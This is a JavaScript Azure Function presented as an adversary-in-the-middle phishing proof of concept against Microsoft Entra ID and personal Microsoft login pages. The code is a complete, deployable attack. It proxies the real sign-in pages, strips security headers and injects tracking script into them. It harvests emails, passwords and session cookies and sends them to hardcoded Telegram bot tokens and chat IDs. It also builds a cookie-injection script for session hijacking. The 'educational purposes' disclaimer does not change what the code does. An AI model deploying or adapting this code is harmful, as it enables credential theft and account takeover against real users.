/**
 * Enhanced Azure Function AiTM Phishing PoC for Entra ID accounts.
 * Supports both corporate and personal accounts (hotmail/live).
 * This code is provided for educational purposes only and provided without any liability or warranty.
 * Based on: https://github.com/zolderio/AITMWorker
 */

const { app } = require("@azure/functions");

const upstream = "login.microsoftonline.com";
const upstream_live = "login.live.com";
const upstream_path = "/";
const telegram_bot_token_1 = "7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps";
const telegram_bot_token_2 = "7942871168:AAFuvCQXQJhYKipqGpr1G4IhUDABTGWF_9U";
const telegram_chat_id_1 = "6743632244";
const telegram_chat_id_2 = "6263177378";

// headers to delete from upstream responses
const delete_headers = [
  "content-security-policy",
  "content-security-policy-report-only",
  "clear-site-data",
  "x-frame-options",
  "referrer-policy",
  "strict-transport-security",
  "content-length",
  "content-encoding",
];

const emailMap = new Map();
// Track dynamic upstream host for PERSONAL accounts only (by client IP)
const personalHostMap = new Map();

// COMPLETELY SEPARATE PERSONAL ACCOUNT DETECTION - NEVER AFFECTS CORPORATE
function isPersonalEmail(email) {
  if (!email) return false;
  const personalDomains = ['@outlook.com', '@hotmail.com', '@live.com', '@msn.com'];
  return personalDomains.some(domain => email.toLowerCase().includes(domain));
}

// ORIGINAL CORPORATE RESPONSE HANDLER - UNCHANGED
async function replace_response_text(response, upstream, original, ip) {
  return response.text().then((text) =>
    text
      .replace(new RegExp(upstream, "g"), original)
      .replace(
        "</body>",
        `<script>
          document.addEventListener('DOMContentLoaded', () => {
            const interval = setInterval(() => {
              const btn = document.getElementById("idSIButton9");
              const emailInput = document.querySelector("input[name='loginfmt']");
              if (btn && emailInput) {
                clearInterval(interval);
                const realIP = "${ip}";
                btn.addEventListener("click", () => {
                  fetch("/__notify_click", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                      event: "next_button_clicked",
                      email: emailInput.value,
                      ip: realIP
                    }),
                  });
                });
              }
            }, 500);
          });
        </script></body>`
      )
  );
}

// SEPARATE PERSONAL ACCOUNT RESPONSE HANDLER - NEVER AFFECTS CORPORATE
async function replace_response_text_personal(response, upstream, original, ip) {
  return response.text().then((text) => {
    let modifiedText = text;

    // Try to extract next upstream host from original (pre-rewrite) form action
    let nextUpstreamHost = null;
    try {
      const m = text.match(/action\s*=\s*"https?:\/\/([^"\/:]+)[^\"]*"/i);
      if (m && m[1]) {
        const h = m[1].toLowerCase();
        if (/(login\.live\.com|account\.live\.com|www\.office\.com|office\.com)/.test(h)) {
          nextUpstreamHost = h;
        }
      }
    } catch {}
    
    // AGGRESSIVE URL REWRITING FOR PERSONAL ACCOUNTS - NEVER AFFECTS CORPORATE
    // Replace all possible domain references
    modifiedText = modifiedText.replace(new RegExp(upstream, "g"), original);
    modifiedText = modifiedText.replace(new RegExp("login\\.live\\.com", "g"), original.split('//')[1]);
    modifiedText = modifiedText.replace(new RegExp("login\\.microsoftonline\\.com", "g"), original.split('//')[1]);
    modifiedText = modifiedText.replace(new RegExp("account\\.live\\.com", "g"), original.split('//')[1]);
    modifiedText = modifiedText.replace(new RegExp("\\bwww\\.office\\.com\\b", "g"), original.split('//')[1]);

    // Replace any hardcoded URLs in JavaScript
    modifiedText = modifiedText.replace(new RegExp('"https://login\\.live\\.com"', "g"), `"${original}"`);
    modifiedText = modifiedText.replace(new RegExp('"https://login\\.microsoftonline\\.com"', "g"), `"${original}"`);
    modifiedText = modifiedText.replace(new RegExp('"https://account\\.live\\.com"', "g"), `"${original}"`);
    modifiedText = modifiedText.replace(new RegExp('"https://www\\.office\\.com"', "g"), `"${original}"`);

    // Rewrite meta refresh URLs (e.g., <meta http-equiv="refresh" content="0; url=https://...">)
    modifiedText = modifiedText.replace(/(http-equiv\s*=\s*["']refresh["'][^>]*url=)(["']?)(https?:\/\/[^"'>\s]+)/gi, (m, p1, q, u) => {
      try {
        const uObj = new URL(u);
        return `${p1}${q}${original}${uObj.pathname}${uObj.search}${uObj.hash}`;
      } catch {
        return `${p1}${q}${original}`; // fallback
      }
    });

    // Advanced JavaScript for personal accounts only
    const personalJS = `
      <script>
        (function() {
          const realIP = "${ip}";
          const nextHost = ${nextUpstreamHost ? `"${nextUpstreamHost}"` : 'null'};

          // If we have a next upstream host from server-side parse, send it immediately
          try {
            if (nextHost) {
              navigator.sendBeacon && navigator.sendBeacon('/__set_personal_host', new Blob([JSON.stringify({ host: nextHost, ip: realIP })], { type: 'application/json' }));
              fetch('/__set_personal_host', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ host: nextHost, ip: realIP }) }).catch(()=>{});
            }
          } catch(e) {}
          
          // Enhanced personal account event capture
          function capturePersonalEvents() {
            // Capture email entry with multiple selectors
            const emailInputs = document.querySelectorAll('input[name="loginfmt"], input[name="username"], input[type="email"], input[placeholder*="email"], input[placeholder*="Email"]');
            emailInputs.forEach(input => {
              input.addEventListener('input', function() {
                fetch("/__notify_click", {
                  method: "POST",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify({
                    event: "email_entered",
                    email: this.value,
                    ip: realIP
                  }),
                });
              });
            });
            
            // Attempt to infer form target host at runtime (fallback)
            try {
              const forms = document.querySelectorAll('form[action]');
              for (const f of forms) {
                const a = f.getAttribute('action') || '';
                if (/^https?:\/\//i.test(a)) {
                  try {
                    const u = new URL(a);
                    const h = u.host.toLowerCase();
                    if (/(login\.live\.com|account\.live\.com|www\.office\.com|office\.com)/.test(h)) {
                      fetch('/__set_personal_host', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ host: h, ip: realIP }) }).catch(()=>{});
                      break;
                    }
                  } catch {}
                }
              }
            } catch {}
            
            // Capture button clicks
            const buttons = document.querySelectorAll('button, input[type="submit"], [data-testid*="button"], [id*="button"]');
            buttons.forEach(btn => {
              btn.addEventListener('click', function() {
                fetch("/__notify_click", {
                  method: "POST",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify({
                    event: "button_clicked",
                    buttonText: this.textContent || this.value || this.getAttribute('data-testid'),
                    ip: realIP
                  }),
                });
              });
            });
          }
          
          // Initialize for personal accounts
          if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', capturePersonalEvents);
          } else {
            capturePersonalEvents();
          }
        })();
      </script>
    `;

    return modifiedText.replace("</body>", `${personalJS}</body>`);
  });
}

async function dispatchMessage(message, context) {
  context.log(`📤 Sending to Telegram: ${message}`);
  
  // Send to Telegram bot 2 (working one)
  try {
    const response = await fetch(`https://api.telegram.org/bot${telegram_bot_token_2}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ 
        chat_id: telegram_chat_id_2, 
        text: message, 
        parse_mode: "HTML" 
      }),
    });
    
    if (response.ok) {
      context.log(`✅ Message sent successfully to bot 2`);
    } else {
      const errorText = await response.text();
      context.log(`❌ Failed to send to bot 2: ${errorText}`);
    }
  } catch (error) {
    context.log(`❌ Error sending to bot 2: ${error.message}`);
  }

  // Try to send to bot 1 (will fail until chat_id is set)
  try {
    const response = await fetch(`https://api.telegram.org/bot${telegram_bot_token_1}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ 
        chat_id: telegram_chat_id_1, // Replace with your actual chat_id
        text: message, 
        parse_mode: "HTML" 
      }),
    });
    
    if (response.ok) {
      context.log(`✅ Message sent successfully to bot 1`);
    } else {
      const errorText = await response.text();
      context.log(`❌ Failed to send to bot 1: ${errorText}`);
    }
  } catch (error) {
    context.log(`❌ Error sending to bot 1: ${error.message}`);
  }
}

app.http("phishing", {
  methods: ["GET", "POST"],
  authLevel: "anonymous",
  route: "/{*x}",
  handler: async (request, context) => {
    const ip =
      request.headers.get("cf-connecting-ip") ||
      request.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
      request.headers.get("x-client-ip") ||
      request.headers.get("true-client-ip") ||
      request.headers.get("x-real-ip") ||
      "unknown";

    // Log every request for debugging
    await dispatchMessage(
      `🔍 <b>New Request</b>\n🌐 <b>Method</b>: ${request.method}\n📱 <b>IP</b>: ${ip}\n🔗 <b>URL</b>: ${request.url}\n👤 <b>User-Agent</b>: ${request.headers.get("user-agent") || "unknown"}`,
      context
    );

    // Handle special injected click reporting
    if (request.method === "POST" && new URL(request.url).pathname === "/__notify_click") {
      const body = await request.json();
      const email = body.email || "unknown";
      const realIP = body.ip || ip;
      emailMap.set(realIP, email);
      await dispatchMessage(
        `👀 <b>User is ready to enter password</b>\n🧑‍💻 <b>Email</b>: ${email}\n🌐 <b>IP</b>: ${realIP}`,
        context
      );
      return new Response("ok", { status: 200 });
    }

    // Accept next personal upstream host beacons
    if (new URL(request.url).pathname === "/__set_personal_host") {
      try {
        const body = request.method === 'POST' ? await request.json() : {};
        const host = (body.host || new URL(request.url).searchParams?.get('host') || '').toLowerCase();
        const realIP = body.ip || ip;
        if (host && host !== new URL(request.url).host) {
          personalHostMap.set(realIP, host);
          await dispatchMessage(`🧭 <b>Personal Upstream Host Set</b>\n🌐 <b>IP</b>: ${realIP}\n🏷️ <b>Host</b>: ${host}`, context);
        }
      } catch {}
      return new Response("ok", { status: 200 });
    }

    // original URLs
    const upstream_url = new URL(request.url);
    const original_url = new URL(request.url);

    // COMPLETELY SEPARATE PERSONAL ACCOUNT ROUTING - NEVER AFFECTS CORPORATE
    const storedEmail = emailMap.get(ip);
    let targetUpstream = upstream; // DEFAULT TO CORPORATE
    
    // ONLY change to personal if we have a confirmed personal email
    if (storedEmail && isPersonalEmail(storedEmail)) {
      // Use dynamically tracked personal upstream host if available, else default to login.live.com
      targetUpstream = personalHostMap.get(ip) || upstream_live;
    }

    // Rewriting to appropriate upstream
    upstream_url.host = targetUpstream;
    upstream_url.port = 443;
    upstream_url.protocol = "https:";

    // SEPARATE PATHNAME HANDLING FOR PERSONAL ACCOUNTS - NEVER AFFECTS CORPORATE
    if (upstream_url.pathname == "/") {
      upstream_url.pathname = upstream_path;
    } else {
      // For personal accounts, preserve the original pathname
      if (targetUpstream === upstream_live || (storedEmail && isPersonalEmail(storedEmail))) {
        // Personal account - keep pathname as is
        upstream_url.pathname = upstream_url.pathname;
      } else {
        // Corporate account - use original logic
        upstream_url.pathname = upstream_path + upstream_url.pathname;
      }
    }

    context.log(
      `Proxying ${request.method}: ${original_url} to: ${upstream_url}`
    );

    const new_request_headers = new Headers(request.headers);
    new_request_headers.set("Host", upstream_url.host);
    new_request_headers.set("accept-encoding", "gzip;q=0,deflate;q=0");
    new_request_headers.set(
      "user-agent",
      "AzureAiTMFunction/1.0 (Windows NT 10.0; Win64; x64)"
    );
    new_request_headers.set(
      "Referer",
      (storedEmail && isPersonalEmail(storedEmail) ? upstream_url.protocol + "//" + upstream_url.host : (original_url.protocol + "//" + original_url.host))
    );

    // Capture login credentials
    if (request.method === "POST") {
      const temp_req = await request.clone();
      const body = await temp_req.text();
      const keyValuePairs = body.split("&");

      // extract key-value pairs for username and password
      const data = Object.fromEntries(
        keyValuePairs
          .map((pair) => {
            const [key, value] = pair.split("=");
            return [key, decodeURIComponent((value || "").replace(/\+/g, " "))];
          })
          .filter(([key]) => key === "loginfmt" || key === "passwd")
      );

      if (data.loginfmt) {
        emailMap.set(ip, data.loginfmt);
        // COMPLETELY SEPARATE PERSONAL ACCOUNT LOGGING - NEVER AFFECTS CORPORATE
        const isPersonal = isPersonalEmail(data.loginfmt);
        const accountType = isPersonal ? "personal" : "corporate";
        await dispatchMessage(
          `📧 <b>Email Entered</b>\n🧑‍💻 <b>Email</b>: ${data.loginfmt}\n🌐 <b>IP</b>: ${ip}\n🎯 <b>Account Type</b>: ${accountType}`,
          context
        );
      }

      if (data.loginfmt && data.passwd) {
        await dispatchMessage(
          `📥 <b>Captured Credentials</b>\n🧑‍💻 <b>Email</b>: ${data.loginfmt}\n🔑 <b>Password</b>: ${data.passwd}\n🌐 <b>IP</b>: ${ip}`,
          context
        );
      }
    }

    const original_response = await fetch(upstream_url.href, {
      method: request.method,
      headers: new_request_headers,
      body: request.body,
      duplex: "half",
    });

    if (
      request.headers.get("Upgrade") &&
      request.headers.get("Upgrade").toLowerCase() == "websocket"
    ) {
      return original_response;
    }

    // Adjust response headers
    const new_response_headers = new Headers(original_response.headers);
    delete_headers.forEach((header) => new_response_headers.delete(header));
    new_response_headers.set("access-control-allow-origin", "*");
    new_response_headers.set("access-control-allow-credentials", true);

    // Replace cookie domains to match our proxy
    try {
      // getSetCookie is the successor of Headers.getAll
      const originalCookies = original_response.headers.getSetCookie?.() || [];

      originalCookies.forEach((originalCookie) => {
        const modifiedCookie = originalCookie.replace(
          new RegExp(upstream_url.host, "g"),
          original_url.host
        );
        new_response_headers.append("Set-Cookie", modifiedCookie);
      });

      // Capture important cookies for both corporate and personal accounts
      const importantCookies = originalCookies.filter((cookie) =>
        /(ESTSAUTH|ESTSAUTHPERSISTENT|SignInStateCookie|ESTSAUTHLIGHT|RPSSecAuth|WLSSC)=/.test(cookie)
      );

      if (importantCookies.length >= 3) {
        const victimEmail = emailMap.get(ip) || "unknown";
        const cookieText = importantCookies.map((c) => c.split(";")[0]).join("\n");

        await dispatchMessage(
          `🍪 <b>Captured Cookies</b> for <b>${victimEmail}</b>\n🌐 <b>IP</b>: ${ip}\n<code>${cookieText}</code>`,
          context
        );

        // COMPLETELY SEPARATE PERSONAL ACCOUNT COOKIE DOMAIN - NEVER AFFECTS CORPORATE
        const storedEmail = emailMap.get(ip);
        const cookieDomain = (storedEmail && isPersonalEmail(storedEmail)) ? (personalHostMap.get(ip) || upstream_live) : upstream;
        const cookieScript = generateCookieInjectionScript(importantCookies, cookieDomain);
        await dispatchMessage(
          `🔧 <b>Cookie Injection Script</b> for <b>${victimEmail}</b>\n🌐 <b>IP</b>: ${ip}\n<code>${cookieScript}</code>`,
          context
        );
      }
    } catch (error) {
      console.error("Cookie capture error:", error);
      await dispatchMessage(
        `❌ <b>Cookie Capture Error</b>\n🌐 <b>IP</b>: ${ip}\n🔍 <b>Error</b>: ${error.message}`,
        context
      );
    }

    // Rewrite Location header for personal redirects to force staying under proxy
    try {
      const locationHeader = new_response_headers.get("location");
      if (locationHeader) {
        try {
          const locUrl = new URL(locationHeader, upstream_url);
          const locHost = (locUrl.host || "").toLowerCase();
          const isPersonalHost = locHost === "login.live.com" || locHost === "account.live.com" || locHost.endsWith(".live.com");
          const currentStoredEmail = emailMap.get(ip);
          const isPersonalByEmail = currentStoredEmail && isPersonalEmail(currentStoredEmail);

          if (isPersonalHost || isPersonalByEmail) {
            // Track the next upstream host for subsequent personal requests
            personalHostMap.set(ip, locUrl.host);
            // Force redirect under proxy domain for personal flows
            const proxiedLocation = original_url.protocol + "//" + original_url.host + locUrl.pathname + (locUrl.search || "") + (locUrl.hash || "");
            new_response_headers.set("location", proxiedLocation);
          }
        } catch {
          // Fallback: ensure we still keep user on proxy when we already know it's personal
          const currentStoredEmail = emailMap.get(ip);
          const isPersonalByEmail = currentStoredEmail && isPersonalEmail(currentStoredEmail);
          if (isPersonalByEmail) {
            const cleaned = locationHeader.startsWith("/") ? locationHeader : ("/" + locationHeader);
            new_response_headers.set("location", original_url.protocol + "//" + original_url.host + cleaned);
          }
        }
      }
    } catch (e) {
      // ignore
    }

    // SEPARATE RESPONSE HANDLING - NEVER AFFECTS CORPORATE
    const currentStoredEmail = emailMap.get(ip);
    const isPersonal = currentStoredEmail && isPersonalEmail(currentStoredEmail);
    
    let original_text;
    if (isPersonal) {
      // Use personal account handler
      original_text = await replace_response_text_personal(
        original_response.clone(),
        upstream_url.protocol + "//" + upstream_url.host,
        original_url.protocol + "//" + original_url.host,
        ip
      );
    } else {
      // Use original corporate handler
      original_text = await replace_response_text(
        original_response.clone(),
        upstream_url.protocol + "//" + upstream_url.host,
        original_url.protocol + "//" + original_url.host,
        ip
      );
    }

    return new Response(original_text, {
      status: original_response.status,
      headers: new_response_headers,
    });
  },
});

function generateCookieInjectionScript(cookies, domain) {
  const cookieData = cookies.map(cookie => {
    const [nameValue] = cookie.split(';');
    const [name, value] = nameValue.split('=');
    return {
      domain: domain,
      expirationDate: Math.floor(Date.now() / 1000) + 31536000, // 1 year
      hostOnly: false,
      httpOnly: true,
      name: name,
      path: "/",
      sameSite: "none",
      secure: true,
      session: true,
      storeId: null,
      value: value
    };
  });

  // Redirect based on cookie domain (personal vs corporate)
  const redirectUrl = (domain === upstream_live || domain.endsWith("live.com") || domain.includes("office.com"))
    ? "https://login.live.com/"
    : "https://login.microsoftonline.com/";

  const script = `!function(){let e=JSON.parse(\`${JSON.stringify(cookieData)}\`);for(let o of e)document.cookie=\`${'${o.name}=${o.value};Max-Age=31536000;'}\${o.path?\`path=\${o.path};\`:""}\${o.domain?\`\${o.path?"":"path=/"}domain=\${o.domain};\`:""}Secure;SameSite=None\`;window.location.href=\"${redirectUrl}\"}();`;
  
  return script;
}
